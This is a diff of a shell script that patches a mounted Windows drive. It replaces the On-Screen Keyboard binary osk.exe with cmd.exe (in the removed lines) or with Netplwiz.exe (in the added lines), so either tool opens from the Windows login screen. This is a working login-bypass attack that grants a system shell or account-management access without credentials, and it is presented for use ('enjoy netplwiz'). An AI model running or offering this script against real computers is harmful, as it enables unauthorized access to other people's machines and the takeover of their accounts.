@@ -35,9 +35,7 @@ fi
 
 # Logic parts
 cd drive/Windows/System32 
-sudo cp -fpr osk.exe lol.exe 
-sudo rm osk.exe 
-sudo cp -fpr cmd.exe osk.exe 
-sudo cp -fpr $MYDIR/patch.bat .
+sudo cp -fpr osk.exe wtf.exe 
+sudo cp -fpr Netplwiz.exe osk.exe 
 echo "Patching done !"
-echo "Run patch.bat after enabling OSK !"
+echo "Enable OSK and enjoy netplwiz !"
